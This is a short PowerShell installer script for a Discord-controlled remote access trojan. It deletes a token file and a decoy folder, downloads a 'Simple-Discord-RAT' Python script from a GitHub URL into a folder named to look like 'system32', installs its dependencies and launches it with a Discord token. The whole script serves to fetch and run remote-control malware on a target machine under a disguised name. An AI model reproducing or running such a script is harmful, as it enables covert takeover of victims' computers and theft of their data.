#No this doesnt remove the real system32 its just a decoy
Remove-Item -Path 'C:\system32\' -Recurse -Force
cd $Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Themes\
Remove-Item -Path 'token.txt'

mkdir 'C:\system32\'

cd C:\system32\

iwr -Uri https://raw.githubusercontent.com/simen64/Simple-discord-RAT/main/Simple-Discord-RAT.py -OutFile C:\system32\sys-rat.py

py -m pip install discord.py requests python-dotenv --user

Python sys-rat.py $dc
